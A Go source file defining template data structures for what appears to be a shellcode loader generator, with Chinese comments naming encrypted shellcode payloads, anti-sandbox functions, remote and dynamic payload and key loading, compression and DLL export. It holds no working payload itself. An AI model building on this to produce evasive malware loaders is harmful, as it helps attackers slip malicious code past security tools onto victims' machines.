package render

type TmplOpts struct {
	TmplFile     string      // 模板文件路径
	OutputDir    string      // 输出目录路径
	OutputGoName string      // 输出的 Go 文件名
	Data         interface{} // 基础模板渲染数据
}

type Data struct {
	CipherText string      // 保存加密文本的变量名
	PlainText  string      // 保存解密文本的变量名
	DLLibrary  interface{} // Dynamic Link Library - DLL
	Pokemon    interface{} // Pokemon 加载模式
	Loader     interface{} // 加载器
	SandBox    interface{} // 反沙箱模块
	Local      interface{} // 本地加载模块
	Remote     interface{} // 远程加载模块
	Args       interface{} // 参数加载模块
	Compressor interface{} // 压缩算法模块
	Apart      interface{} // 分离加载模块
	Dynamic    interface{} // 动态数据
}

type Loader struct {
	Import string // 导入库
	Method string // loader
}

type SandBox struct {
	Import  string   // 导入库
	Methods []string // 反沙箱函数
}

type Compressor struct {
	Import    string // 导入库
	Algorithm string // 压缩算法
	Ratio     int    // lzw 压缩率, 一般为8
}

type Local struct {
	KeyName      string      // Key 变量名
	KeyValue     string      // Key 值
	IvName       string      // Iv  变量名
	IvValue      string      // Iv  值
	Payload      interface{} // 加密 shellcode
	DecryptLocal string      // 解密函数
	MainLocal    string      // 本地加载方法名
}

type Remote struct {
	Import     string // 导入库
	Url        string // 远程加载Url
	Method     string // 请求方法
	UCFileCode string // UsersCloud加载的参数
	UCMethod   string // 读取UsersCloud的Payload
}

type Dynamic struct {
	Import         string // 导入库
	DynamicUrl     string // 动态获取 Key
	DynamicMethod  string // 动态函数
	MainDynamic    string // 动态加载函数名
	DecryptDynamic string // 解密函数
	KeyName        string // Key 变量名
	DynamicKey     string // 动态获取 Key
	KeyStart       int    // Key 动态起始区间
	KeyEnd         int    // Key 动态结束区间
	IVName         string // IV 变量名
	DynamicIV      string // 动态获取 IV
	IVStart        int    // IV 动态起始区间
	IVEnd          int    // IV 动态结束区间
}

type Args struct {
	Import  string // 导入库
	ArgsKey string // 参数加载设置的密钥
}

type Pokemon struct {
	PokemonPayload []string // Pokemon 加密数组
	MainPokemon    string   // Pokemon 函数名
	DecryptPokemon string   // 解密函数
}

type DLLibrary struct {
	DllFuncName string // 导出DLL函数名
}
